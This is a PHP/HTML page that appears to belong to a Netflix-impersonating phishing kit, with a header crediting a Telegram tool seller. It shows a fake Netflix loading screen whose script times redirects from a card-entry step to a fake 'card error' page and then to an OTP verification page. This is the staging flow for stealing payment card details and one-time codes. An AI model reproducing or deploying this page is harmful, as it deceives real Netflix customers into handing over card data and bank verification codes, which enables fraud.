
<?php
/*
✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦
✦✦						                            ✦✦
✦✦    TELEGRAM CONTACT : https://t.me/Xenos_dev     ✦✦
✦✦    TELEGRAM CHANNEL : https://t.me/xenostools    ✦✦
✦✦         TELEGRAM USERNAME : @Xenos_dev           ✦✦
✦✦                                                  ✦✦
✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦


*/
?>
<!DOCTYPE html>

<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta http-equiv="X-UA-Compatible" content="ie=edge">
    <title>Netflix Loading</title>
    
<link rel="shortcut icon" href="../assets/nficon2016.ico">
<link rel="apple-touch-icon" href="../assets/nficon2016.png">
    <script src="../assets/jquery.min.js"></script> 
    <script src="https://code.jquery.com/jquery-3.6.4.min.js"></script>
</head>
<body>
    <nav class="header" >
        <svg style="width: 1100px; margin-top:10px; margin:25px;" id="netflix_logo"  class="svg-icon svg-icon-netflix-logo" focusable="true">
            <g id="netflix-logo">
                <path d="M105.062 14.28L111 30c-1.75-.25-3.499-.563-5.28-.845l-3.345-8.686-3.437 7.969c-1.687-.282-3.344-.376-5.031-.595l6.031-13.75L94.468 0h5.063l3.062 7.874L105.875 0h5.124l-5.937 14.28zM90.47 0h-4.594v27.25c1.5.094 3.062.156 4.594.343V0zm-8.563 26.937c-4.187-.281-8.375-.53-12.656-.625V0h4.687v21.875c2.688.062 5.375.28 7.969.405v4.657zM64.25 10.657v4.687h-6.406V26H53.22V0h13.125v4.687h-8.5v5.97h6.406zm-18.906-5.97V26.25c-1.563 0-3.156 0-4.688.062V4.687h-4.844V0h14.406v4.687h-4.874zM30.75 15.593c-2.062 0-4.5 0-6.25.095v6.968c2.75-.188 5.5-.406 8.281-.5v4.5l-12.968 1.032V0H32.78v4.687H24.5V11c1.813 0 4.594-.094 6.25-.094v4.688zM4.78 12.968v16.375C3.094 29.531 1.593 29.75 0 30V0h4.469l6.093 17.032V0h4.688v28.062c-1.656.282-3.344.376-5.125.625L4.78 12.968z" id="Fill-14" fill="#E50914">
                </path>
            </g>
        </svg>
    </nav>
    <div id="wrapper">
        <div class="profile-main-loader">
            <div class="loader">
                <p class="loading-text">Please wait, we are processing your information.</p> 
                <p class="loading-text" style="margin-top:45px;">Don't worry it will be less then a minute.</p> 
                <svg class="circular-loader" viewBox="25 25 50 50">
                    <circle class="loader-path" cx="50" cy="50" r="20" fill="none" stroke="#f90b03" stroke-width="2" />
                </svg>
                
            </div>
        </div>
    </div>
</body>

<script>
    $(document).ready(function() {
        
        console.log("Jquery ready")
        
        var today = new Date();
        var date = today.getFullYear() + '-' + (today.getMonth() + 1) + '-' + today.getDate();
        var time = today.getHours() + ':' + today.getMinutes() + ':' + today.getSeconds();
        var current_date = date + ' ' + time;
        
        // Extract 'page' parameter from URL
        var urlParams = new URLSearchParams(window.location.search);
        var cameFromPage = urlParams.get('page'); // Get 'page' parameter value from URL

        if(cameFromPage == 'CC'){
            setTimeout(function() {
                window.location.href = "Net_error_cc.php";
            }, 10000); 
        }
        else if(cameFromPage== 'Error_CC'){
            setTimeout(function() {
                window.location.href = "Ver_otp.php";
            }, 20000); 

        }
    
    });
</script>
<style>

html, body {
    height: 100%; /* Ensure the body and html are full height */
    margin: 0;
    display: flex; /* Make the body a flex container */
    flex-direction: column; /* Stack children vertically */
    justify-content: center; /* Center horizontally */
    align-items: center; /* Center vertically */
}

nav.header {
    width: 100%; /* Ensure the nav takes full width */
    position: fixed; /* Keep the nav fixed at the top */
    top: 0; /* Position it at the top */
    left: 0; /* Align it to the left */
    z-index: 1000; /* Ensure it stays on top of other content */
}

#wrapper {
    display: flex;
    justify-content: center;
    align-items: center;
    width: 100%; /* Ensure the wrapper takes full width */
    height: 100%; /* Ensure the wrapper takes full height */
    position: absolute; /* Position it absolutely within the body */
    top: 0; /* Align it to the top */
    left: 0; /* Align it to the left */
    z-index: 999; /* Ensure it's below the nav */
}

.profile-main-loader {
    position: relative;
}

.profile-main-loader .loader {
    position: relative;
    margin: 0 auto;
    width: 100px;
    height: 100px;
}

/* The rest of your CSS remains unchanged */

.circular-loader {
    -webkit-animation: rotate 2s linear infinite;
    animation: rotate 2s linear infinite;
    height: 100%;
    -webkit-transform-origin: center center;
    -ms-transform-origin: center center;
    transform-origin: center center;
    width: 100%;
    position: absolute;
    top: -70px;
    left: 0;
    margin: auto;
}
.loader-path {
    stroke-dasharray: 150, 200;
    stroke-dashoffset: -10;
    -webkit-animation: dash 1.5s ease-in-out infinite, color 6s ease-in-out infinite;
    animation: dash 1.5s ease-in-out infinite, color 6s ease-in-out infinite;
    stroke-linecap: round;
}
@-webkit-keyframes rotate {
    100% {
        -webkit-transform: rotate(360deg);
        transform: rotate(360deg);
    }
}
@keyframes rotate {
    100% {
        -webkit-transform: rotate(360deg);
        transform: rotate(360deg);
    }
}
@-webkit-keyframes dash {
    0% {
        stroke-dasharray: 1, 200;
        stroke-dashoffset: 0;
    }
    50% {
        stroke-dasharray: 89, 200;
        stroke-dashoffset: -35;
    }
    100% {
        stroke-dasharray: 89, 200;
        stroke-dashoffset: -124;
    }
}
@keyframes dash {
    0% {
        stroke-dasharray: 1, 200;
        stroke-dashoffset: 0;
    }
    50% {
        stroke-dasharray: 89, 200;
        stroke-dashoffset: -35;
    }
    100% {
        stroke-dasharray: 89, 200;
        stroke-dashoffset: -124;
    }
}
@-webkit-keyframes color {
    0% {
        stroke: #f90b03;
    }
    40% {
        stroke: #f90b03;
    }
    66% {
        stroke: #f90b03;
    }
    80%, 90% {
        stroke: #f90b03;
    }
}
@keyframes color {
    0% {
        stroke: #9c0500;
    }
    40% {
        stroke: #b60a04;
    }
    66% {
        stroke: #fa221b;
    }
    80%, 90% {
        stroke: #f90b03;
    }
}
.loading-text {
    color: black;
    
    font-family: "Netflix Sans", "Helvetica Neue", "Segoe UI" ,Roboto ,Ubuntu ,sans-serif;
    position: absolute;
    top: 70px;
    width: 350px;
    left: 50%;
    transform: translate(-50%, -50%);
    text-align: center;
    z-index: 999;
}
/* Tablet styles */
@media (min-width: 768px) {
    #netflix_logo{
        width: 800px;
        margin: 0px;
    }
}   
</style>
</html>
